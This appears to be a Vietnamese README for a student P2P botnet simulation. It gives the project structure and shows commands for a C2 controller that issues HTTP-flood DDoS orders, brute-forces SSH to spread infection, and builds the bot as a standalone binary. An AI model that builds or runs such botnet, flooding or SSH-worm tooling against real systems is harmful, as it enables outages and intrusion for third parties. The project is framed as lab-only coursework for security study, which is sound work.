# Botnet P2P Simulation

Mô phỏng botnet P2P phục vụ nghiên cứu an ninh mạng (bài tập lớn).

> ⚠️ **Chỉ dùng cho mục đích học tập trong môi trường lab. Tấn công hệ thống thực tế là vi phạm pháp luật.**

## Cấu trúc

```
├── bot.py            # wrapper chạy bot
├── botmaster.py      # C2 controller (gửi lệnh, brute-force SSH)
├── crypto_utils.py   # tool sinh keypair Ed25519
├── bot/
│   ├── __main__.py   # entry point
│   ├── config.py     # cấu hình + shared state
│   ├── crypto.py     # verify chữ ký Ed25519
│   ├── p2p.py        # UDP listener, gossip protocol
│   ├── attack.py     # HTTP flood
│   └── commands.py   # xử lý lệnh DDOS/STOP/KILL
└── scripts/
    └── deploy.sh
```

## Cài đặt

```bash
pip install pynacl paramiko
```

## Sử dụng

### Chạy bot trên zombie

```bash
python3 bot.py
```

### Botmaster (điều khiển)

```bash
# kiểm tra bot sống/chết
python3 botmaster.py check all

# tấn công DDoS
python3 botmaster.py ddos <zombie_ip> <target_ip> <port> <duration>

# dừng tấn công
python3 botmaster.py stop <zombie_ip>

# kill bot
python3 botmaster.py kill <zombie_ip>

# brute-force SSH + lây nhiễm
python3 botmaster.py brute <target_ip>
```

### Sinh keypair mới

```bash
python3 crypto_utils.py generate
```

Copy private key → `botmaster.py`, public key → `bot/config.py`.

## Build binary

```bash
pip install pyinstaller
pyinstaller --onefile --name bot bot.py
```

File output ở `dist/bot`.

## Cách hoạt động

- Bot lắng nghe UDP port 9999
- Owner gửi lệnh đã ký (Ed25519) đến 1 bot → bot gossip đến toàn mạng
- Lệnh được verify chữ ký + version check trước khi thực thi
- Hỗ trợ: HTTP Flood (500 threads/bot), STOP, KILL
